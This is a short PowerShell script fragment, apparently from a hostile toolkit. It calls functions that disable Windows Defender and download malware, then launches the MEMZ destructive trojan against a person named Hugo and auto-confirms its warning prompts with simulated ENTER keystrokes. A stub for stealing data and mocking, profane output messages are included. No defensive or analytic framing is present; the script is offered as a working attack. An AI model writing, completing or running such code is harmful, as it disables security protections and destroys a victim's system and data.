function persistanceChanges {
    param (
        [string]$malwareDirectory
    )

    function FUCKHUGO {
        Write-Output "[!!!] FUCK HUGO"
        $memzPath = "$malwareDirectory\MEMZ.exe"
        Add-Type -AssemblyName System.Windows.Forms
        Start-Process -FilePath $memzPath -PassThru -NoNewWindow
        
        for ($i = 3; $i -ge 1; $i--) {
            Write-Output "[+] FUCKED IN $i"
            Start-Sleep -Seconds 1
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

        Write-Output "[+] HAHAHAHAH THIS IS SO FUNNY"

        for ($i = 3; $i -ge 1; $i--) {
            Write-Output "[+] PERMA FUCKED IN $i"
            Start-Sleep -Seconds 1
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

    }

    function stealData {

    }

    disableWindowsDefender
    downloadMalware
    FUCKHUGO # HIGH RISK - SCRIPTED FOR THE OTHER SCRIPT
}